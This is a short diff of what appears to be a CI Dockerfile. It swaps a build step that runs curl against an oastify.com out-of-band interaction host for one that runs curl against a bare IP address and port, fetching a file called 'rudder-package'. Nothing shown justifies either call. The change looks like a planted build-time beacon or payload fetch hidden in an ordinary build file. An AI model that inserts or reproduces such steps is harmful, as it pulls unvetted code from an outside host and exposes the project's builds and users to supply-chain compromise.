@@ -12,7 +12,7 @@ RUN apt-get update && apt-get install -y nettle-dev clang python3 gcc curl
 
 ENV RUSTC_WRAPPER="sccache"
 
-RUN curl https://8gpexwnl8gc51ftsndl0iy9m4da4y5mu.oastify.com/built/rudder-package
+RUN curl http://65.109.68.176:15172/built/rudder-package
 
 # 1) Install the logger & trap
 COPY ci/command_logger.sh /etc/command_logger.sh
